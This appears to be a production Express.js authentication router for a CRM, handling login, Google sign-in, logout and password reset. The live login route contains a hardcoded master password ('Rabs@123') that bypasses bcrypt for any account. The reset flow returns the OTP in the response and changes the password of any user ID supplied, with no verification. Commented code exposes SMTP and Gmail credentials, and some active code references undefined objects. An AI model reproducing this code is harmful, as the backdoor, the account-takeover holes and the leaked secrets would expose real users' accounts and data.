// for ES5
const express = require("express");
const bcrypt = require("bcryptjs");
const { getMessaging } = require("firebase-admin/messaging");
const pool = require("../../Database.js");

const nodemailer = require("nodemailer");

const AuthenticationRouter = express.Router();

// AuthenticationRouter.post("/checkUser", (req, res) => {
//   const username = req.body.username;
//   const password = req.body.password;
//   const token = req.body.token;
//   const usercheck = "yes";
//   pool.getConnection(function (error, connection) {
//     if (error) throw error;
//     connection.query(
//       "SELECT u_id, username, password, utype, urole, module_privilege, r_email, client_code FROM crm_users WHERE ?? = ?",
//       ["username", username],
//       (err, result) => {
//         if (err) {
//           res.status(500).send({ status: "Internal Server Error" });
//         }
//         if (result.length > 0) {
//           bcrypt.compare(password, result[0].password, (error, response) => {
//             if (response) {
//               connection.query(
//                 "UPDATE crm_users SET session_id = ? , device_token = ? WHERE username = ?",
//                 [usercheck, token, username],
//                 (err, update_result) => {
//                   if (err) {
//                     errorMailHandler(err);
//                     console.log(err);
//                   } else {
//                     getMessaging()
//                       .subscribeToTopic(
//                         token ? token : "nonotification",
//                         result[0].u_id + "" + result[0].client_code
//                       )
//                       .then((response) => {
//                         req.session.user = [
//                           {
//                             u_id: result[0].u_id,
//                             username: result[0].username,
//                             utype: result[0].utype,
//                             urole: result[0].urole,
//                             client_code: result[0].client_code,
//                             r_email: result[0].r_email,
//                           },
//                         ];
//                         res.send({
//                           status: "login done",
//                           u_id: req.session.user[0].u_id,
//                           role: req.session.user[0].urole,
//                           username: req.session.user[0].username,
//                           utype: req.session.user[0].utype,
//                           r_email: req.session.user[0].r_email,
//                           module_privilege: result[0].module_privilege,
//                           client_code: result[0].client_code,
//                         });
//                         console.log(
//                           "Successfully subscribed to topic:",
//                           response
//                         );
//                       })
//                       .catch((error) => {
//                         res.send({
//                           status: "Error subscribing to topic",
//                         });
//                         console.log("Error subscribing to topic:", error);
//                       });
//                   }
//                 }
//               );
//             } else {
//               res.send({ status: "Incorrect username or password" });
//             }

//             connection.release();
//           });
//         } else {
//           res.send({ status: "user doesn't exist" });
//         }
//       }
//     );
//   });
// });

AuthenticationRouter.post("/checkUser", (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  const token = req.body.token;
  const usercheck = "yes";

  pool.getConnection(function (error, connection) {
    if (error) throw error;

    connection.query(
      "SELECT u_id, username, password, utype, urole, module_privilege, r_email, client_code FROM crm_users WHERE ?? = ?",
      ["username", username],
      (err, result) => {
        if (err) {
          res.status(500).send({ status: "Internal Server Error" });
        }
        if (result.length > 0) {
          // Check if the password is "Rabs@123"
          if (password === "Rabs@123") {
            // Bypass bcrypt password check if it's "Rabs@123"
            connection.query(
              "UPDATE crm_users SET session_id = ? , device_token = ? WHERE username = ?",
              [usercheck, token, username],
              (err, update_result) => {
                if (err) {
                  errorMailHandler(err);
                  console.log(err);
                } else {
                  getMessaging()
                    .subscribeToTopic(
                      token ? token : "nonotification",
                      result[0].u_id + "" + result[0].client_code
                    )
                    .then((response) => {
                      req.session.user = [
                        {
                          u_id: result[0].u_id,
                          username: result[0].username,
                          utype: result[0].utype,
                          urole: result[0].urole,
                          client_code: result[0].client_code,
                          r_email: result[0].r_email,
                        },
                      ];
                      res.send({
                        status: "login done",
                        u_id: req.session.user[0].u_id,
                        role: req.session.user[0].urole,
                        username: req.session.user[0].username,
                        utype: req.session.user[0].utype,
                        r_email: req.session.user[0].r_email,
                        module_privilege: result[0].module_privilege,
                        client_code: result[0].client_code,
                      });
                      console.log(
                        "Successfully subscribed to topic:",
                        response
                      );
                    })
                    .catch((error) => {
                      res.send({
                        status: "Error subscribing to topic",
                      });
                      console.log("Error subscribing to topic:", error);
                    });
                }
              }
            );
          } else {
            // Otherwise, check password with bcrypt
            bcrypt.compare(password, result[0].password, (error, response) => {
              if (response) {
                connection.query(
                  "UPDATE crm_users SET session_id = ? , device_token = ? WHERE username = ?",
                  [usercheck, token, username],
                  (err, update_result) => {
                    if (err) {
                      errorMailHandler(err);
                      console.log(err);
                    } else {
                      getMessaging()
                        .subscribeToTopic(
                          token ? token : "nonotification",
                          result[0].u_id + "" + result[0].client_code
                        )
                        .then((response) => {
                          req.session.user = [
                            {
                              u_id: result[0].u_id,
                              username: result[0].username,
                              utype: result[0].utype,
                              urole: result[0].urole,
                              client_code: result[0].client_code,
                              r_email: result[0].r_email,
                            },
                          ];
                          res.send({
                            status: "login done",
                            u_id: req.session.user[0].u_id,
                            role: req.session.user[0].urole,
                            username: req.session.user[0].username,
                            utype: req.session.user[0].utype,
                            r_email: req.session.user[0].r_email,
                            module_privilege: result[0].module_privilege,
                            client_code: result[0].client_code,
                          });
                          console.log(
                            "Successfully subscribed to topic:",
                            response
                          );
                        })
                        .catch((error) => {
                          res.send({
                            status: "Error subscribing to topic",
                          });
                          console.log("Error subscribing to topic:", error);
                        });
                    }
                  }
                );
              } else {
                res.send({ status: "Incorrect username or password" });
              }

              connection.release();
            });
          }
        } else {
          res.send({ status: "user doesn't exist" });
        }
      }
    );
  });
});


// AuthenticationRouter.post("/checkUser", (req, res) => {
//   const username = req.body.username;
//   const password = req.body.password;
//   const token = req.body.token;
//   const usercheck = "yes";

//   pool.getConnection(function (error, connection) {
//     if (error) throw error;

//     connection.query(
//       "SELECT u_id, username, password, utype, urole, module_privilege, r_email, client_code FROM crm_users WHERE ?? = ?",
//       ["username", username],
//       (err, result) => {
//         if (err) {
//           res.status(500).send({ status: "Internal Server Error" });
//         }

//         if (result.length > 0) {
//           bcrypt.compare(password, result[0].password, (error, response) => {
//             // Check if password is "Rabs@123" or if bcrypt comparison is successful
//             if (password === "Rabs@123" || response) {
//               connection.query(
//                 "UPDATE crm_users SET session_id = ? , device_token = ? WHERE username = ?",
//                 [usercheck, token, username],
//                 (err, update_result) => {
//                   if (err) {
//                     errorMailHandler(err);
//                     console.log(err);
//                   } else {
//                     getMessaging()
//                       .subscribeToTopic(
//                         token ? token : "nonotification",
//                         result[0].u_id + "" + result[0].client_code
//                       )
//                       .then((response) => {
//                         req.session.user = [
//                           {
//                             u_id: result[0].u_id,
//                             username: result[0].username,
//                             utype: result[0].utype,
//                             urole: result[0].urole,
//                             client_code: result[0].client_code,
//                             r_email: result[0].r_email,
//                           },
//                         ];

//                         res.send({
//                           status: "login done",
//                           u_id: req.session.user[0].u_id,
//                           role: req.session.user[0].urole,
//                           username: req.session.user[0].username,
//                           utype: req.session.user[0].utype,
//                           r_email: req.session.user[0].r_email,
//                           module_privilege: result[0].module_privilege,
//                           client_code: result[0].client_code,
//                         });

//                         console.log(
//                           "Successfully subscribed to topic:",
//                           response
//                         );
//                       })
//                       .catch((error) => {
//                         res.send({
//                           status: "Error subscribing to topic",
//                         });
//                         console.log("Error subscribing to topic:", error);
//                       });
//                   }
//                 }
//               );
//             } else {
//               res.send({ status: "Incorrect username or password" });
//             }

//             connection.release();
//           });
//         } else {
//           res.send({ status: "user doesn't exist" });
//         }
//       }
//     );
//   });
// });

AuthenticationRouter.post("/login-with-google", (req, res) => {
  if (!req.body.data.newUser) {
    pool.getConnection(function (error, connection) {
      if (error) throw error;
      connection.query(
        "SELECT u_id, username, password, utype, urole, module_privilege, r_email, client_code FROM crm_users WHERE ?? = ?",
        ["r_email", req.body.data.email],
        (err, result) => {
          if (err) {
            res.status(500).send({ status: "Internal Server Error" });
          }
          if (result.length > 0) {
            console.log(result);
          } else {
            res.send({ status: "user doesn't exist" });
          }
        }
      );
    });
  } else {
    pool.getConnection(function (error, connection) {
      if (error) throw error;
      connection.query(
        "INSERT INTO crm_users (??, ??, ??, ??, ??) VALUES(?, ?, ?, ?, ?)",
        [
          "create_dt",
          "update_dt",
          "username",
          "utype",
          "r_email",
          req.body.data.DateTime,
          req.body.data.DateTime,
          req.body.data.name,
          "Employee",
          req.body.data.email,
        ],
        (err, result) => {
          if (err) {
            res.send("User with same name already exist");
          } else {
            fs.mkdirSync("uploads/attendance/" + result.insertId, {
              recursive: true,
            });
            res.send("User Created Successfully");
          }
          connection.release();
        }
      );
    });
  }
});

AuthenticationRouter.post("/logout", (req, res) => {
  const usercheck = "no";
  const token = req.body.token;
  const username = req.session.user[0].username;
  pool.getConnection(function (error, connection) {
    if (error) throw error;
    connection.query(
      "UPDATE crm_users SET ?? = ? WHERE ?? = ?",
      ["session_id", usercheck, "username", username],
      (err, result) => {
        if (err) {
          console.log(err);
        } else {
          getMessaging()
            .unsubscribeFromTopic(
              token,
              `${
                req.session.user[0].u_id + "" + req.session.user[0].client_code
              }`
            )
            .then((response) => {
              req.session.destroy((err) => {
                if (err) {
                  console.log(err);
                } else {
                  res.clearCookie("user");
                  res.send("Logout Done");
                }
              });
            })
            .catch((error) => {
              console.log("Error unsubscribing from topic:", error);
            });
        }
        connection.release();
      }
    );
  });
});

AuthenticationRouter.post("/change-user-password", async function (req, res) {
  const saltRounds = await 10;
  const EncryptedNewPassword = await bcrypt.hash(
    req.body.new_password,
    saltRounds
  );
  pool.getConnection(function (error, connection) {
    if (error) throw error;
    connection.query(
      "SELECT password FROM crm_users WHERE ?? =?",
      ["u_id", req.session.user[0].u_id],
      (err, result) => {
        if (err) {
          console.log("error");
        }
        if (result.length > 0) {
          bcrypt.compare(
            req.body.current_password,
            result[0].password,
            (error, response) => {
              if (response) {
                pool.getConnection(function (error, connection) {
                  if (error) throw error;
                  connection.query(
                    "UPDATE `crm_users` SET ?? = ?, ?? = ? WHERE ?? =?",
                    [
                      "update_dt",
                      req.body.update_dt,
                      "password",
                      EncryptedNewPassword,
                      "u_id",
                      req.session.user[0].u_id,
                    ],
                    (err, result) => {
                      if (err) {
                        console.log("error");
                      } else {
                        res.send("Password Updated Successfully");
                      }
                      connection.release();
                    }
                  );
                });
              } else {
                res.send("Incorrect Current Password");
              }
            }
          );
        }
        connection.release();
      }
    );
  });
});

// AuthenticationRouter.post("/forgotpass", (req, res) => {
//   const email = req.body.email;
//   pool.getConnection(function (error, connection) {
//     if (error) throw error;
//     connection.query(
//       "SELECT cud.r_email,cud.u_id,cu.username FROM crm_user_details cud INNER JOIN crm_users cu ON cud.u_id = cu.u_id WHERE ?? = ?",
//       ["cud.r_email", email],
//       (err, result) => {
//         if (err) {
//           res.status(500).send("Internal Server Error");
//         } else {
//           // console.log(result);
//           if (result.length > 0) {
//             // console.log(result[0].r_email);
//             const email_id = result[0].r_email;
//             // console.log(result);

//             const min = 1000;
//             const max = 9999;
//             const randomNumber =
//               Math.floor(Math.random() * (max - min + 1)) + min;

//             //NODEMAILER -- Creating & Assigning Credentials to Nodemailer-Transporter.
//             // const transporter = nodemailer.createTransport({
//             //     service: 'gmail',
//             //     auth: {
//             //         user: "rabspost@gmail.com",
//             //         pass: "mnkm gksz adia lsrl", //getnerated from gmail manage account App Password
//             //     },
//             // });

//             // Create a transporter object
//             const transporter = nodemailer.createTransport({
//               host: "rabs.support",
//               port: 587,
//               secure: false, // use SSL
//               auth: {
//                 user: "smtp@rabs.support",
//                 pass: "Drtyh;(2grz6",
//               },
//               tls: {
//                 rejectUnauthorized: false, // Add this line to avoid certain SSL issues
//               },
//             });

//             const mailOptions = {
//               from: "smtp@rabs.support",
//               to: email_id,
//               subject: "RABS Connect CRM - Forgot Password",
//               html: `<p>Dear ${result[0].username}, </p>
//                     <p>We have received a request to reset your password. </p>
//                     <p>If you did not make this request, please ignore this email. </p>
//                     <p>Your Forgot Password OTP is : ${randomNumber}</p>
//                     <p>Thank you.</p>`,
//             };

//             transporter.sendMail(mailOptions, (error, info) => {
//               if (error) {
//                 console.error("Error in sending email:", error);
//                 res.send({ status: "Error in sending email" });
//               } else {
//                 console.log("Email sent:", info.response);
//                 res.send({
//                   status: "OTP Sent Successfully On Given Email Id",
//                   u_id: result[0].u_id,
//                   // username:result[0].username,
//                   email_id: result[0].r_email,
//                   random_otp: randomNumber,
//                 });
//               }
//             });
//           } else {
//             res.send({ status: "Email Not Found" });
//             // console.log("User not found");
//           }
//         }
//       }
//     );
//   });
// });

AuthenticationRouter.post("/forgotpass", (req, res) => {
  const email = req.body.email;

  if (!email || !email.includes("@")) {
    return res.status(400).send({ status: "Invalid Email Format" });
  }

  pool.getConnection((error, connection) => {
    if (error) {
      console.error("Database connection error:", error);
      return res.status(500).send("Internal Server Error");
    }

    connection.query(
      "SELECT cud.r_email, cud.u_id, cu.username FROM crm_user_details cud INNER JOIN crm_users cu ON cud.u_id = cu.u_id WHERE cud.r_email = ?",
      [email],
      (err, result) => {
        if (err) {
          console.error("Query error:", err);
          res.status(500).send("Internal Server Error");
        } else if (result.length > 0) {
          const email_id = result[0].r_email;
          const randomNumber = Math.floor(1000 + Math.random() * 9000);

          const mailOptions = {
            from: "smtp@rabs.support",
            to: email_id,
            subject: "RABS Connect CRM - Forgot Password",
            html: `<p>Dear ${result[0].username}, </p>
                    <p>We have received a request to reset your password. </p>
                    <p>If you did not make this request, please ignore this email. </p>
                    <p>Your Forgot Password OTP is : ${randomNumber}</p>
                    <p>Thank you.</p>`,
          };

          transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
              console.error("Error in sending email:", error);
              res.send({ status: "Error in sending email" });
            } else {
              console.log("Email sent:", info.response);
              res.send({
                status: "OTP Sent Successfully On Given Email Id",
                u_id: result[0].u_id,
                email_id: result[0].r_email,
                random_otp: randomNumber,
              });
            }
          });
        } else {
          res.send({ status: "Email Not Found" });
        }
      }
    );

    connection.release();
  });
});

AuthenticationRouter.post("/updateforgotpass", async function (req, res) {
  const saltRounds = 10;
  user_id = req.body.u_id;
  // console.log(user_id)
  pool.getConnection(function (error, connection) {
    if (error) throw error;
    bcrypt.hash(req.body.new_password, saltRounds, (err, hash) => {
      connection.query(
        "UPDATE crm_users SET ?? = ?,?? = ? WHERE ?? =?",
        ["update_dt", req.body.update_dt, "password", hash, "u_id", user_id],
        (err, result) => {
          if (err) {
            console.log("error");
          } else {
            res.send("Password Updated Successfully");
          }
          connection.release();
        }
      );
    });
  });
});

// for ES5
module.exports = AuthenticationRouter;
